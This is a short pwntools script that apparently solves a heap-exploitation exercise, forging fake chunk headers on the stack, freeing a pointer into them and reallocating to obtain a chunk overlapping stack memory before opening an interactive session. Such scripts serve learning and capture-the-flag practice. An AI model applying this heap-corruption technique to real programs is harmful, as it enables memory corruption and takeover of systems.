from pwn import *
from handle import *

def exploit():
	malloc(0x10)
	fake_chunk1 = stack_var_1_address()
	fake_chunk2 = stack_var_2_address()
	write_to_stack_var_1("AAAAAAAA" + p64(fake_chunk2 - fake_chunk1))
	write_to_stack_var_2("AAAAAAAA" + p64(0x1000))
	free(int(fake_chunk1 + 2*0x8))
	malloc(fake_chunk2 - fake_chunk1 - 0x8)

p = exec_file()

exploit()
p.interactive()

p.close()
